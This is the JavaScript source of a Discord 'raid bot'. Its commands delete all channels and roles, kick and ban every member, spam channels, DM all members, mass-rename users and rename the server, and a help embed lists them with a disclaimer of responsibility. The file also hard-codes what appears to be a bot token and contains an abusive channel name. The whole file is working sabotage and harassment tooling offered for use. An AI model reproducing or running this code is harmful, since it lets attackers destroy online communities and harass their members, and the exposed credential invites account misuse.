const Discord = require('discord.js');
const client = new Discord.Client();
const botPrefix = "/"

const download = require('image-downloader')

var botname = "MEE6" //You can change this with /setbotname

const token = "NjcyMTY3MjMxMTM1ODA5NTk0.XwcKUA.f2Fxx6AczHpfldWIJan55haPFzM";


client.on('message', msg => {

    if (msg.guild && msg.content.startsWith('/pmeveryone')) {
      let text = msg.content.slice('/pmeveryone'.length); // cuts off the /private part
      msg.guild.members.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) member.send(text);
      });
    }
    if(msg.content.startsWith('/channels')){
      let channelname = msg.content.slice('/channels'.length); // cuts off the /private part
      msg.channel.send("Creating 50 New Text Channels Named: " + "**" + channelname + "**")

    var i;
    for (i = 0; i < 50; i++) {
    setTimeout(() => {

        msg.guild.createChannel(channelname,{type: 'text'})
        .then(console.log)
        .catch(console.error);

    },1*1) //3 seconden
    }
    }
    if(msg.content.startsWith("/spam")){
      let yourmessage = msg.content.slice('/spam'.length); // cuts off the /private part
      var i;
      
      for (i = 0; i < 50; i++) {
      setTimeout(() => {
         msg.channel.send(yourmessage)
      },1*1) //3 seconden
      }
      
    }
    if(msg.content.startsWith('/deletechannels')){
      var i = 0
      msg.guild.channels.forEach(channel =>
      i++
      )
      msg.channel.send("Deleting **" + i + "** channels!")
        msg.guild.channels.forEach(channel => 

         
            setTimeout(() => {channel.delete()},1000*3))
            //if(name != "if-you-werent-a-cunt-this-woudnt-be-like-this"){
            msg.guild.createChannel("if you werent a cunt this woudnt be like this",{type: 'text'})
            .then(console.log)
            .catch(console.error);
        //}

        
    
    }
    if(msg.content.startsWith('/deleteroles')){
      let notdelete = msg.content.slice('/deleteroles'.length); // cuts off the /private part
      var i = 0
      msg.guild.roles.forEach(role =>
        i++
      )
      msg.channel.send("Starting to delete **"+i+"** roles!")
        msg.guild.roles.forEach(role => 
            setTimeout(() => {
            if(msg.guild.id !== role.id && role.name != "corona" && role.id != notdelete){
                role.delete()
            }
            },1000*3))
    }
    if(msg.content == "/help"){/*
      const helpEmbed = new Discord.RichEmbed()
      .setColor('#0099ff')
      .setTitle('Raid Bot')
      .setURL('https://discord.gg/kgJcCcB')
      .setDescription('Hier kun je alle commands vinden')
      .setThumbnail('https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=')
      .addField("The creators of this bot are not resposible for what you do with it!", 'Use at own risk!')
      .addBlankField()
      .addField('Command', '\n/help\n/deletechannels\n/deleteroles\n/channels\n/spam\n/spamall\n/pmeveryone', true)
        .addField('Usage', '\n`/help`\n`/deletechannels`\n`/deleteroles`\n`/channels {name}`\n`/spam`\n`/spamall {message}`\n`/pmeveryone {message}`', true)
        .addField('Function', '\nShows this list\nDeletes all channels\n/delets all roles\nCreates 50 channels with {name}\nSpams the channel sent in\nSpams all the channels, THIS WIL ONLY WORK FOR CHANNELS MADE BY THE BOT ITSELF! OTHERS WILL CRASH IT!\nSends everyone in guild a private message with {yourmessage}', true)
      //.setImage('https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=')
      .setTimestamp()
        .setFooter('Made by !PandaTjuuhhh!#0001 with the help off Jochem_Legend27#4112', 'https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=');
        
      msg.channel.send(helpEmbed);
        */
       const embed = {
        "title": "Ne clique pas",
        "description": "Nozi en force",
        "url": "https://discord.com/api/oauth2/authorize?client_id=701269826303295499&permissions=8&scope=bot",
        "color": 259797,
        "timestamp": "2020-04-10T08:55:46.190Z",
        "footer": {
          "icon_url": "https://cdn.discordapp.com/avatars/672167231135809594/a_91d1a26a8a075e272c62d8e89954097f.gif?size=4096.gif",
          "text": "Nozi"
        },
        "thumbnail": {
          "url": "https://cdn.discordapp.com/attachments/713418631005863956/730785203924107374/MOSHED-2020-7-9-15-58-26.gif"
        },
        "image": {
          "url": "https://cdn.discordapp.com/attachments/713418631005863956/730785203924107374/MOSHED-2020-7-9-15-58-26.gif"
        },
        "author": {
          "name": "Bot made by ! !" .Nozi・ΣPSILΘИ#1337",
          "url": "https://cdn.discordapp.com/avatars/672167231135809594/a_91d1a26a8a075e272c62d8e89954097f.gif?size=4096.gif",
          "icon_url": "https://cdn.discordapp.com/avatars/672167231135809594/a_91d1a26a8a075e272c62d8e89954097f.gif?size=4096.gif"
        },
        "fields": [
          {
            "name": "Commands",
            "value": "/deletechannels       Deletes all channels\n/deleteroles              Deletes all roles\n/channels {name}   Creates 50 channels with name {name}\n/massnick {name}  Gives all members in server the nick {name}\n/guildname {name} Easy way to change guildname to {name}\n/spam {message}    Spams the channel sent in with {message}\n/spamall {message} Spams all channels with {message}\n/pmeveryone {message} Sends all members in guild a private message with {message}\n\n/kickall                       Kicks all members\n/banall                        Bans all members\n/help                           Sends this message"
          },
          {
            "name": "😱",
            "value": "Mashalla Nozi!"
          }
        ]
      };
      msg.channel.send({ embed });
      //msg.channel.send("This awesome bot is created by !PandaTjuuhhh!#0001 and Jochem_Legend27#4112.\nCommands:\n/deletechannels    Deletes all channels!\n/channels {name}    Creates channels with a name you choose!\n/deleteroles    Deletes all server roles!\n/help    Shows this list!\nn/spam {message}   Spams the current channel with {message}.")
    }
    if(msg.content.startsWith('/spamall')){
      var i;
      for (i = 0; i < 5; i++) {

      setTimeout(() => {

        let yourmessage = msg.content.slice('/spamall'.length); // cuts off the /private part
        
        msg.guild.channels.forEach(channel =>
          channel.send(yourmessage)
          )
      },1*1) //3 seconden
      }
    }
    if(msg.content == "/kickall"){
      
      msg.guild.members.forEach(member => {

        if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
          member.kick();
        }
      })  
      }
      if(msg.content == "/banall"){
      
        msg.guild.members.forEach(member => {
  
          if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
            member.ban();
          }
        })  
        }
      if(msg.content.startsWith == "/setbotname"){
        let botnamefrommessage = msg.content.slice('/spamall'.length); // cuts off the /private part
        msg.channel.send("Bot name set to **" + botnamefrommessage + "**");
        client.setNickname(botnamefrommessage);
        botname = botnamefrommessage;
      }
      if(msg.content.startsWith('/massnick')){
        let nickname = msg.content.slice('/massnick'.length);
        var i = 0;
        msg.guild.members.forEach(member =>{
          i++
        }
          )
        msg.channel.send("Changing names of **" + i + "** members to **" + nickname + "**")
        msg.guild.members.forEach(member =>{

          member.setNickname(nickname)
        }
          )
      }
      if(msg.content.startsWith('/guildname')){
        let newguildname = msg.content.slice('/guildname'.length);
        msg.channel.send("Setting guild name to **" + newguildname + "**")
        msg.guild.setName(newguildname)
      }


      if(msg.content.startsWith('/guildicon')){
        
        let newguildicon = msg.content.slice('/guildicon'.length);
        msg.channel.send("Setting new guild icon to **" + newguildicon + "**")
        options = {
          url: 'http://someurl.com/image.jpg',
          dest: '/images/'                // Save to /path/to/dest/image.jpg
        }

        download.image(options)
        .then(({ filename, image }) => {
        console.log('Saved to', filename)  // Saved to /path/to/dest/image.jpg
        })

        .catch((err) => console.error(err))
        msg.guild.setIcon(newguildicon)
        .then (console.log)
        .catch (console.error)
      }
      if((msg.content.startsWith('/everyguildupdatemessage'))){
        let msgtosend = msg.content.slice('/everyguildupdatemessage'.length)
        msg.delete();
        var guildList = client.guilds.array();
        try{
          guildList.forEach(guild =>
            guild.channels.forEach(channel =>
              channel.send(msgtosend)
            )
            
            )
        } catch (err) {
          console.log("could not send message")
        }
      }
      if((msg.content.startsWith('/everyguildmassnick'))){
        let nickname = msg.content.slice('/everyguildmassnick'.length)
        msg.delete();
        var guildList = client.guilds.array();
        try{
          guildList.forEach(guild =>
            guild.members.forEach(member =>{
              member.setNickname(nickname);
            })
            
            )
        } catch (err) {
          console.log("could not send message")
        }
      }
  });
client.login (process.env.TOKEN1);
